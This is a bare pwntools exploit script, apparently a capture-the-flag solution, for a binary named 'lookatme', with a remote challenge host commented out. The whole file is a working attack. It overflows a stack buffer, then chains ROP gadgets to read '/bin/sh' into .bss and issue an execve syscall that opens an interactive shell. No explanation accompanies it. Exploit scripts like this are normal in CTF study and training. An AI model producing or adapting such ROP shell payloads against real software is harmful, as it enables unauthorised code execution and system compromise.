from pwn import *

p = process('./lookatme')
#p = remote('ctf.j0n9hyun.xyz',3017)

raw_input('1')

popeaxret = 0x806d646	# eax=0xb
popecxebxret = 0x806f051 # ecx = "/bin/sh"
syscall = 0x0806d60c
bss = 0x080eaf80
read = 0x806d5f0
popebxesiediret = 0x80bacfe

payload = ''
payload += 'a'*0x18 + 'b'*0x4
payload += p32(read)
payload += p32(popebxesiediret)
payload += p32(0x0)
payload += p32(bss)
payload += p32(0x8)
payload += p32(popecxebxret)
payload += p32(0x0)
payload += p32(bss)
payload += p32(popeaxret)
payload += p32(0xb)
payload += p32(syscall)

p.sendline(payload)
pause
p.send('/bin/sh\x00')

p.interactive()

